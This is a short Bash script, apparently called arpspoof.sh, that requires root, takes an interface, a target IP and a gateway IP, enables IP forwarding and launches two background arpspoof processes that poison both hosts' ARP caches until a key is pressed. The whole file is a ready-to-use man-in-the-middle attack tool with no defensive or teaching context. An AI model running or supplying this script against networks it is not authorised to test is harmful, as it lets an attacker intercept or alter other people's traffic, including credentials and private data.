
#!/bin/bash

if [[ $EUID -ne 0 ]]; then
    echo "You must be root"
    exit 1
fi

if [[ $# -ne 3 ]]; then
    echo "Usage example: ./arpspoof.sh eth0 192.168.1.123 192.168.1.1"
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof!
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
PID1=$!
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
PID2=$!

echo "Press any key to stop spoofing..."
read

# Stop
kill -9 $PID1 $PID2
echo 0 > /proc/sys/net/ipv4/ip_forward

exit 0
